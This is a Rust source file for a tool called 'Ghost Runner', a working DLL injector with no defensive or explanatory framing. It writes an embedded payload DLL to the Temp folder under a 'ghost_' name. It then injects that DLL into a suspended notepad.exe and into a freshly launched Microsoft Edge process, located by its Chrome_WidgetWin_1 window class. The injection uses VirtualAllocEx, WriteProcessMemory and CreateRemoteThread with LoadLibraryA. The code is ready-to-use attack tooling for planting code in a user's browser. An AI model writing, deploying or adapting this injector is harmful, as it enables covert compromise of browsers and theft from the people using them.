use std::ffi::CString;
use std::ptr;
use std::io::Write;
use std::time::Duration;
use windows_sys::Win32::Foundation::{FALSE, TRUE, CloseHandle, HWND, BOOL, LPARAM};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA, ResumeThread,
    OpenProcess, CreateRemoteThread, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE
};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    EnumWindows, GetWindowThreadProcessId, GetWindowTextA, IsWindowVisible, GetClassNameA
};

// path relative to src/main.rs
const PAYLOAD_BYTES: &[u8] = include_bytes!("../../../target/x86_64-pc-windows-gnu/release/ghost_payload.dll");

static mut TARGET_PID: u32 = 0;
// Chrome_WidgetWin_1 is the window class for Chrome/Edge main windows
const TARGET_CLASS: &str = "Chrome_WidgetWin_1";

fn main() {
    println!("[*] Ghost Runner (Microsoft Edge Edition)");
    println!("[!] Note: Run as Administrator for best results.");

    // 0. Cleanup
    cleanup_stale_ghosts();

    // 1. Bung DLL ra Temp
    let mut temp_path = std::env::temp_dir();
    let dll_name = format!("ghost_{}.dll", 
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()
    );
    temp_path.push(dll_name);
    
    if let Ok(mut file) = std::fs::File::create(&temp_path) {
        let _ = file.write_all(PAYLOAD_BYTES);
    } else {
        println!("[-] Failed to Write Payload to Temp!");
        return;
    }
    
    let dll_path_str = CString::new(temp_path.to_str().unwrap()).unwrap();

    // 2. Spawn Notepad (Reference - Optional)
    spawn_notepad(&dll_path_str);

    // 3. Spawn Microsoft Edge
    spawn_msedge_hunter(&dll_path_str);

    println!("[+] All ghosts deployed.");
    println!("[*] Note: Payload DLL remains in Temp until reboot/cleanup.");
    
    // Keep window open briefly
    std::thread::sleep(Duration::from_secs(2));
}

fn spawn_notepad(dll_path: &CString) {
    println!("[*] Spawning notepad.exe (Suspended)...");
    unsafe {
        let program = CString::new("notepad.exe").unwrap();
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        
        let success = CreateProcessA(
            ptr::null(),
            program.as_ptr() as *mut u8,
            ptr::null(),
            ptr::null(),
            FALSE,
            CREATE_SUSPENDED,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi
        );
        
        if success == 0 {
            println!("(!) Failed to spawn notepad.exe");
            return;
        }

        inject_dll(pi.dwProcessId, dll_path);
        
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

fn spawn_msedge_hunter(dll_path: &CString) {
    println!("[*] Launching Microsoft Edge...");

    // Launch Edge via CMD to rely on System PATH
    let cmd_line_str = "cmd.exe /c start msedge";
    let cmd_line = CString::new(cmd_line_str).unwrap();

    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let success = CreateProcessA(
            ptr::null(),
            cmd_line.as_ptr() as *mut u8,
            ptr::null(),
            ptr::null(),
            FALSE,
            CREATE_NEW_CONSOLE, 
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi
        );

        if success == 0 {
            println!("(!) Failed to launch Edge via CMD.");
            return;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Hunt for Edge Window using Class Name
        let mut retries = 0;
        TARGET_PID = 0;

        println!("[*] Hunting for Edge Window (Class: {})...", TARGET_CLASS);
        
        while retries < 40 { // 10 seconds
            std::thread::sleep(Duration::from_millis(250));
            EnumWindows(Some(enum_finder), 0);
            
            if unsafe { TARGET_PID } != 0 {
                break;
            }
            retries += 1;
        }

        if unsafe { TARGET_PID } != 0 {
            let pid = unsafe { TARGET_PID };
            println!("[+] Found Edge Window -> Injecting PID: {}", pid);
            inject_dll(pid, dll_path);
        } else {
            println!("[-] Failed to find Edge window (Timeout).");
        }
    }
}

unsafe extern "system" fn enum_finder(hwnd: HWND, _lparam: LPARAM) -> BOOL {
    if IsWindowVisible(hwnd) != 0 {
        let mut buffer = [0u8; 256];
        let len = GetClassNameA(hwnd, buffer.as_mut_ptr(), 256);
        if len > 0 {
            let class_name = std::str::from_utf8_unchecked(&buffer[..len as usize]);
            if class_name == TARGET_CLASS {
                let mut pid = 0;
                GetWindowThreadProcessId(hwnd, &mut pid);
                TARGET_PID = pid;
                return FALSE; // Stop enumeration
            }
        }
    }
    TRUE
}

unsafe fn inject_dll(pid: u32, dll_path: &CString) {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if h_process == 0 {
        println!("[-] Injection Failed: OpenProcess Error (PID: {}) - Run as Admin!", pid);
        return;
    }

    let path_len = dll_path.as_bytes().len() + 1;
    let remote_mem = VirtualAllocEx(h_process, ptr::null(), path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if !remote_mem.is_null() {
        WriteProcessMemory(h_process, remote_mem, dll_path.as_ptr() as *const _, path_len, ptr::null_mut());
        
        let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
        let load_lib = GetProcAddress(k32, b"LoadLibraryA\0".as_ptr());
        
        let h_thread = CreateRemoteThread(
            h_process, ptr::null(), 0, 
            std::mem::transmute(load_lib), 
            remote_mem, 0, ptr::null_mut()
        );
        
        if h_thread != 0 {
            WaitForSingleObject(h_thread, INFINITE);
            CloseHandle(h_thread);
        }
    }
    CloseHandle(h_process);
}

fn cleanup_stale_ghosts() {
    let temp_dir = std::env::temp_dir();
    if let Ok(entries) = std::fs::read_dir(&temp_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                if name.starts_with("ghost_") && name.ends_with(".dll") {
                    let _ = std::fs::remove_file(&path);
                }
            }
        }
    }
}
